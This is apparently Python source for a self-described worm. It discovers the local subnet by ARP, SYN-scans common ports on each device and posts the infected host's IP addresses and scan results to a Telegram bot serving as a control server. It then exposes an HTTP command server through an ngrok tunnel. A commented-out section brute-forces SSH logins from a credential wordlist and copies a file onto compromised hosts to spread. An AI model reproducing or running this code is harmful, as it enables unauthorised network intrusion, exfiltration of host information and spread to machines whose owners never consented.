import json
import requests
import paramiko
import scp as sc
import multiprocessing as mp
import netifaces
import ipcalc
import netaddr
import sys
import subprocess
from scapy.all import *
from pyngrok import ngrok
from http.server import BaseHTTPRequestHandler, HTTPServer


import time as t

"""
PROPAGATION
"""
def propagate(host,port,username,password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host,port,username,password,banner_timeout=2)
		scp = sc.SCPClient(ssh.get_transport())
		scp.put("owned.txt","~/")
		scp.close()
		ssh.close()
	except:
		ssh.close()
		

"""
SSH BRUTE FORCE
"""
def connection_established(host,port,username,password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host,port,username,password,banner_timeout=2)
		ssh.close()
		return True
	except:
		ssh.close()
		return False

def ssh_brute_force(host,port):

	creds_file = open("credentials.txt","r")
	cred_list = creds_file.read().split("\n")
	creds_file.close()
	cred_list = [creds.split(",") for creds in cred_list if creds]
	
	for index in range(0,len(cred_list)):
		cred_list[index].insert(0,port)
		cred_list[index].insert(0,host)
		
	pool = mp.Pool()
	results = pool.starmap(connection_established,cred_list)

	if True in results:
		credentials = cred_list[results.index(True)]  
	else: 
		credentials ="password not in the wordlist"

	return credentials

	
"""
PORT SCAN
"""
def scan(target_ip):
	
	open_ports = []
	
	for port in  [20,21,22,23,25,53,80,443,5900,8080]:
		tcp = TCP(sport=2525,dport=port,flags="S")
		ip = IP(dst=target_ip)
		SYN = ip/tcp
		SYNACK = sr1(SYN,verbose=0,timeout=2,retry=2)
		if SYNACK and 'R' not in SYNACK[TCP].flags:
			open_ports.append(port)
			
	return [target_ip,open_ports]

def port_scan(network):

	targets = [elem[0] for elem in network]
	pool = mp.Pool()
	results = pool.map(scan,targets)
	results = [elem for elem in results if elem[1]]
	return results
	
	
"""
NETWORK DISCOVERY
"""
def send_arp(ip_address):
	arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
	response = srp1(arp_packet,verbose=False,timeout=0.5,retry=2)
	if response: return [ip_address,response[ARP].hwsrc]
	else: return 0
		
def discover_network(subnet):
	pool = mp.Pool()
	results = pool.map(send_arp,subnet)
	results = [elem for elem in results if elem != 0]
	return results

def calculate_subnet(host,netmask,gateway,broadcast):
	cidr = str(netaddr.IPAddress(netmask).netmask_bits())
	subnet = ipcalc.Network(host+"/"+ cidr)
	subnet = [str(ip) for ip in subnet if str(ip) != gateway and \
					       str(ip) != broadcast and \
					       str(ip) != host]
	return subnet
	
"""
SEND FEEDBACK TO CONTROL SERVER
"""
def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_ports):

	ret_status = 1 # meaning that there are devices on the subnet with well known ports open
	
	public_ip = requests.get("https://api.ipify.org").text
	
	status = "Infected host and its network informations:\n" + \
		 "host public ip: " + public_ip + "\n" + \
		 "host private ip: " + host_ip + "\n" + \
		 "netmask: " + netmask + "\n" + \
		 "broadcast: " + broadcast + "\n" + \
		 "gateway: " + gateway + "\n\n"	 

	if not devices_open_ports:
		status += "All devices have no well known ports open!\n"
		ret_status = 0 # meaning that there aren't devices on the subnet with well known ports open
	else:
		status += "Network I'm in:\n"
		for elem in devices_open_ports:
			status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n"

	post_req = requests.post("https://api.telegram.org/bot"+token+ \
				  "/sendMessage",data={"chat_id":chat_id,"text":status})
				  
	return ret_status
				  
"""
DETERMINE WICH INTERFACE I'M USING
"""
def determine_if():
	interfaces = netifaces.interfaces()
	interfaces = [elem for elem in interfaces if elem != 'lo']
	
	online_interfaces = []
	
	for interface in interfaces:
		if netifaces.AF_INET in netifaces.ifaddresses(interface).keys():
			online_interfaces.append(interface)
	
	if not online_interfaces: return 0
	else: return online_interfaces[0]
	
"""
HTTP SERVER FUNCTIONALITIES
"""
def ls():
	process = subprocess.run("ls",stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
	return process.stdout
	
def delete():
	# TODO: KILL python process and delete all worm files
	return "deleted"
	
def execute_command(command):
	if command == "ls":
		return ls()
	elif command == "delete":
		return delete()

class my_http_request_handler(BaseHTTPRequestHandler):

	def do_POST(self):
		"""
		READ POST REQUEST
		"""
		content_length = int(self.headers["Content-Length"])
		post_data = self.rfile.read(content_length)
		
		
		allowed_commands = ["ls","delete"]
		command = post_data.decode("utf-8")
		
		if command in allowed_commands:
			output = execute_command(command)
			"""
			RESPONSE HEADERS
			"""
			self.send_response(200)
			self.send_header("Content-type","text/html")
			self.end_headers()
			
			"""
			RESPONSE DATA
			"""
			self.wfile.write(output.encode("utf-8"))
		else:
			self.send_response(400)
			self.send_header("Content-type","text/html")
			self.end_headers()
			self.wfile.write(b"COMMAND DOES NOT EXISTS")
		

def run_server(host,port,tel_token,chat_id):
	http_tunnel = ngrok.connect(port)	
	print("opening http tunnel at: " + http_tunnel.public_url)
	
	"""
	COMMUNICATING TUNNEL URL TO CONTROL SERVER
	"""
	post_req = requests.post("https://api.telegram.org/bot"+tel_token+"/sendMessage", \
				      data={"chat_id":chat_id,"text":"tunnel: "+http_tunnel.public_url})
		
	"""
	STARTING WEB SERVER
	"""
	webserver = HTTPServer((host,port),my_http_request_handler)
	
	try:
		webserver.serve_forever()
	except KeyboardInterrupt:
		pass
	
	webserver.server_close()

if __name__ == "__main__":
	
	### CHECK IF ONLINE ###
	print("checking if host is online...")
	interface = determine_if()
	if interface == 0 : sys.exit("Not online")

	### NETWORK DISCOVERY ###
	print("discovering network...")
	info = netifaces.ifaddresses(interface)[netifaces.AF_INET]
	host_ip = info[0]['addr']
	netmask = info[0]['netmask']
	gateway = netifaces.gateways()[netifaces.AF_INET][0][0]
	broadcast = info[0]['broadcast']
	
	subnet = calculate_subnet(host_ip,netmask,gateway,broadcast)
	
	network = discover_network(subnet)
	
	### PORT SCAN OF EACH DEVICE ON THE NETWORK ###
	print("scanning each device's ports on the network...")
	devices_open_ports = port_scan(network)
	
	### CONFIG ###
	con_file = open("config.json","r")
	config = json.load(con_file)
	con_file.close()

	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
	print("sending feedback to control server...")
	ret_status = send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
	
	### TODO : MODIFY BEHAVIOR
	if ret_status == 0 : sys.exit("no device with wkp open, nothing to do here")
	
	print("starting http server. Waiting for commands...")
	run_server("localhost",2525,config["http_token"],config["chat_id"])
	
	"""
	### SSH BRUTE FORCE ###
	ssh_targets = [elem[0] for elem in devices_open_ports if 22 in elem[1]]
	if not ssh_targets: sys.exit("no device with ssh active, not possibile to spread")
	
	for target_ip in ssh_targets:
		credentials = [ssh_brute_force(target_ip,22)]
		
	print(credentials)
	### AUTO PROPAGATION ###
	for target in credentials:
		if isinstance(target,list):
			propagate(target[0],target[1],target[2],target[3])		
	"""
